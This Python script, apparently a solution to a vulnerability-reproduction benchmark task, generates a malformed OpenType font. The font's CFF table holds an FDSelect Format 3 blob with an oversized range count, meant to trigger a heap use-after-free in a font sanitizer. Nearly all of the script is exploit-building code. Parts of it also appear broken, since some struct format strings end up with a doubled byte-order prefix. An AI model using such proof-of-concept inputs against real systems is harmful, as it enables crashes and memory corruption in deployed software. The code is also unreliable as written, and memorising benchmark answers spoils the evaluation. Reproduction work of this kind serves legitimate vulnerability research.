import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap-use-after-free in the CFF table serialization
        logic. It can be triggered by crafting a CFF table that causes the parser
        to fail in a specific way. The sanitizer's main logic fails to check for
        this parsing error, proceeds to clean up the partially parsed CFF object,
        and then later tries to serialize this freed object, leading to a UAF.

        The trigger is a malformed FDSelect table within a CID-keyed CFF font.
        Specifically, we use FDSelect Format 3 and provide a large `nRanges` value.
        The parser attempts to read this many ranges from a buffer that is too
        small, causing it to fail.

        The PoC consists of a minimal but structurally valid OpenType font with a
        CFF table containing the malicious FDSelect data.
        """

        def pack_be(fmt, *args):
            return struct.pack('>' + fmt, *args)

        def encode_cff_number(n):
            if -107 <= n <= 107:
                return bytes([n + 139])
            elif 108 <= n <= 1131:
                n -= 108
                return bytes([(n >> 8) + 247, n & 0xFF])
            elif -1131 <= n <= -108:
                n = -(n + 108)
                return bytes([(n >> 8) + 251, n & 0xFF])
            elif -32768 <= n <= 32767:
                return b'\x1c' + pack_be('h', n)
            else:
                return b'\x1d' + pack_be('i', n)

        def encode_cff_int32_op(val):
            return b'\x1d' + pack_be('i', val)

        def create_sfnt_header(num_tables):
            header = b'OTTO'
            header += pack_be('H', num_tables)
            entry_selector = 0
            search_range = 1
            while search_range * 2 <= num_tables:
                search_range *= 2
                entry_selector += 1
            search_range *= 16
            range_shift = num_tables * 16 - search_range
            header += pack_be('H', search_range)
            header += pack_be('H', entry_selector)
            header += pack_be('H', range_shift)
            return header

        def create_table_record(tag, data, offset):
            record = tag.encode('ascii')
            record += pack_be('I', 0)  # checksum - not needed for PoC
            record += pack_be('I', offset)
            record += pack_be('I', len(data))
            return record

        def create_head():
            table = bytearray(54)
            table[0:4] = pack_be('I', 0x00010000)
            table[4:8] = pack_be('I', 0x00010000)
            table[12:16] = pack_be('I', 0x5F0F3CF5)
            table[18:20] = pack_be('H', 1000)
            return bytes(table)

        def create_hhea():
            table = bytearray(36)
            table[0:4] = pack_be('I', 0x00010000)
            table[4:6] = pack_be('h', 750)
            table[6:8] = pack_be('h', -250)
            table[34:36] = pack_be('H', 1)
            return bytes(table)

        def create_maxp(num_glyphs):
            return pack_be('IH', 0x00005000, num_glyphs)

        def create_os2():
            return bytes(78)

        def create_post():
            return pack_be('I', 0x00030000) + b'\x00' * 28

        def create_cmap():
            subtable = pack_be('>HHHHHHHH', 4, 16, 0, 2, 2, 0, 0, 0xFFFF) + \
                       b'\x00\x00' + pack_be('>HhH', 0xFFFF, 1, 0)
            record = pack_be('>HHI', 3, 1, 12)
            header = pack_be('>HH', 0, 1)
            return header + record + subtable

        def create_hmtx(num_glyphs, num_h_metrics):
            table = pack_be('>Hh', 500, 100)
            if num_glyphs > num_h_metrics:
                table += pack_be('>h', 100) * (num_glyphs - num_h_metrics)
            return table

        def create_cff_table():
            malicious_fdselect_blob = b'\x03\xff\xff'
            charstrings_index_blob = b'\x00\x00'
            fd_dict_blob = encode_cff_number(0) + encode_cff_number(0) + b'\x12'
            fd_array_index_blob = b'\x00\x01\x01\x01' + bytes([1 + len(fd_dict_blob)]) + fd_dict_blob
            string_index_blob = b'\x00\x00'
            global_subr_index_blob = b'\x00\x00'
            
            cff_header_part = b'\x01\x00\x04\x01' + b'\x00\x00'
            
            top_dict_data = b''
            # Two-pass calculation to resolve circular offset dependency
            for _ in range(2):
                top_dict_index = b'\x00\x01\x01\x01' + bytes([1 + len(top_dict_data)]) + top_dict_data
                base_offset = len(cff_header_part) + len(top_dict_index) + \
                              len(string_index_blob) + len(global_subr_index_blob)
                
                off_charstrings = base_offset
                off_fdarray = off_charstrings + len(charstrings_index_blob)
                off_fdselect = off_fdarray + len(fd_array_index_blob)

                top_dict_data = b''
                top_dict_data += encode_cff_number(0) + encode_cff_number(0) + encode_cff_number(0) + b'\x0c\x1e' # ROS
                top_dict_data += encode_cff_int32_op(off_charstrings) + b'\x11'
                top_dict_data += encode_cff_int32_op(off_fdarray) + b'\x0c\x24'
                top_dict_data += encode_cff_int32_op(off_fdselect) + b'\x0c\x25'

            cff_table = bytearray()
            cff_table += cff_header_part
            cff_table += top_dict_index
            cff_table += string_index_blob
            cff_table += global_subr_index_blob
            cff_table += charstrings_index_blob
            cff_table += fd_array_index_blob
            cff_table += malicious_fdselect_blob
            return bytes(cff_table)
        
        num_glyphs = 1
        tables_data = {
            b'maxp': create_maxp(num_glyphs),
            b'hmtx': create_hmtx(num_glyphs, 1),
            b'hhea': create_hhea(),
            b'post': create_post(),
            b'OS/2': create_os2(),
            b'cmap': create_cmap(),
            b'head': create_head(),
            b'CFF ': create_cff_table()
        }
        
        table_tags = sorted(tables_data.keys())
        num_tables = len(table_tags)
        
        sfnt_header = create_sfnt_header(num_tables)
        header_len = 12 + 16 * num_tables
        
        table_directory = bytearray()
        tables_blob = bytearray()
        
        current_offset = header_len
        for tag_bytes in table_tags:
            tag_str = tag_bytes.decode('ascii')
            data = tables_data[tag_bytes]
            
            padding = b'\x00' * ((4 - len(tables_blob) % 4) % 4)
            tables_blob += padding
            
            offset = header_len + len(tables_blob)
            record = create_table_record(tag_str, data, offset)
            table_directory += record
            tables_blob += data
        
        return sfnt_header + table_directory + tables_blob